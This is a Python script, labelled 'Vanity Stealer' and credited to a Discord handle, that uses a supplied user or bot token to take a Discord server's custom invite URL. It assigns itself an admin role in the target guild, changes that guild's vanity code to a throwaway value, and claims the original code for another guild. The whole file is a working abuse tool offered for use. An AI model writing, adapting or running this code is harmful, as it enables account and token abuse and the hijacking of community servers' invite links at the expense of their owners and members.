import aiohttp
import sys
import asyncio
import random
import os
from typing import Optional
import httpx

def clear():
  if sys.platform in ["linux", "linux2", "darwin"] or os.name == "posix":
    os.system("clear")
  else:
    os.system("cls")

def setTitle(title: Optional[any]=None):
  os.system(f"title {title}")

clear()
setTitle("Vanity Stealer - [KaramveerPlayZ#1337]")

base = "https://discord.com/api/v9/users/@me"

token = input("KaramveerPlayZ#1337 | Enter Token: ")
res = httpx.get(base, headers={"Authorization": token})
print(res.status_code)
if res.status_code in [204, 200, 201]:
  headers = {"Authorization": token, "X-Audit-Log-Reason": "karamveerplayz-stealer"}
  username = f"{res.json()['username']}#{res.json()['discriminator']}"
  id = int(res.json()['id'])
else:
  res = httpx.get(base, headers={"Authorization": f"Bot {token}"})
  if res.status_code in [204, 200, 201]:
    headers = {"Authorization": f"Bot {token}", "X-Audit-Log-Reason": "karamveerplayz-stealer"}
    username = f"{res.json()['username']}#{res.json()['discriminator']}"
    id = int(res.json()['id'])
  else:
    print("KaramveerPlayZ#1337 | Invaild Token.")
    sys.exit()

guild_id_to_steal_from = int(input("KaramveerPlayZ#1337 | Guild ID To Steal From: "))

guild_id_to_add_vanity = int(input("KaramveerPlayZ#1337 | Guild ID To Add Vanity: "))

role_id = int(input("KaramveerPlayZ#1337 | Admin Role ID: "))

code = input("KaramveerPlayZ#1337 | Vanity Code: https://discord.gg/")

numb = random.randint(1, 99)


print(f"Logged In As: {username}\nAttempting To Steal https://discord.gg/{code}")

async def add_role():
  async with aiohttp.ClientSession(headers=headers) as session:
    async with session.put(f"https://discord.com/api/v10/guilds/{guild_id_to_steal_from}/members/{id}/roles/{role_id}") as response:
      if response.status in (204, 200, 201, 299, 500):
        print("KaramveerPlayZ#1337 | Added Admin Role")
    

async def change_vanity_code():
  async with aiohttp.ClientSession(headers=headers) as ClientSession:
    async with ClientSession.patch(f"https://discord.com/api/v10/guilds/{guild_id_to_steal_from}/vanity-url", json={"code": f"karamveerplayz-stealer-{numb}"}) as response:
      if response.status in (204, 200, 201, 299, 500):
        print("KaramveerPlayZ#1337 | Changed Vanity Url Code From Target Guild")



async def add_vanity_code():
  async with aiohttp.ClientSession(headers=headers) as ClientSession:
    async with ClientSession.patch(f"https://discord.com/api/v10/guilds/{guild_id_to_add_vanity}/vanity-url", json={"code": code}) as response:
      if response.status in (204, 200, 201, 299, 500):
        print("KaramveerPlayZ#1337 | Successfully Stolen Vanity")


async def startup():
  sex = loop.create_task(add_role())
  await asyncio.sleep(0.1)
  sexxed = loop.create_task(change_vanity_code())
  await asyncio.sleep(0.1)
  sexxed_x_2 = loop.create_task(add_vanity_code())
  await asyncio.wait([sex, sexxed, sexxed_x_2])



loop = asyncio.get_event_loop()
loop.run_until_complete(startup())
loop.close()
